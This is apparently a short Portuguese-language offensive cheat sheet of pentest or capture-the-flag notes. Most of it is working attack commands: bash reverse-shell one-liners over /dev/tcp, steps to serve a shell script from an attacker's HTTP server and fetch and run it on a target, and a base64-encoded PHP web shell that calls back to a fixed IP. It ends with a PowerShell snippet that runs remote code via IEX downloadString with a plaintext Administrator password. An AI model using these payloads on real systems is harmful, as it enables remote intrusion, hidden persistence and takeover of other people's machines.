## Payloads:  

### Bash:  
`/bin/bash -c 'bash -i > /dev/tcp/$LHOST/$LPORT 0>&1'`  
`bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1`  

## Shell reversa com script bash:  
1. Crie um script em bash com o payload `bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1` e extensão `.sh`.  
2. Inicie um servidor http na máquina atacante com `python3 -m http.server 80`  
3. Faça o download do script na máquina alvo na pasta temporária com `curl http://$LHOST/shell.sh -o /tmp/shell.sh`  
4. Altere a permissão de execução do arquivo no alvo com `chmod +x /tmp/shell.sh`  
5. Execute o script no alvo com `/bin/bash /tmp/shell.sh`  


## Criar shell reversa em PHP no alvo com echo, utilize o comando abaixo para gerar o payload:  
```bash
echo "echo $(echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.9.58.140/443 0>&1'\"); ?>" | base64) | base64 -d > shell.php"
# Payload:
#echo PD9waHAgZXhlYygiL2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjkuNTguMTQwLzQ0MyAwPiYxJyIpOyA/Pgo= | base64 -d > shell.php
```

### Capturar requisições do ping:
```bash
sudo tcpdump -i tun0 icmp
```

# Subir shell e executar com credencial do administrador

```powershell
# Variável com a senha em texto claro
$SecPass = ConvertTo-SecureString 's67u84zKq8IXw' -AsPlainText -Force  

# Variável com as credenciais do admin
$cred = New-Object System.Management.Automation.PSCredential('Administrator',$SecPass)  

# Download da shell utilizando as credenciais e executando
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2:81/shell.ps1')" -Credential $cred
```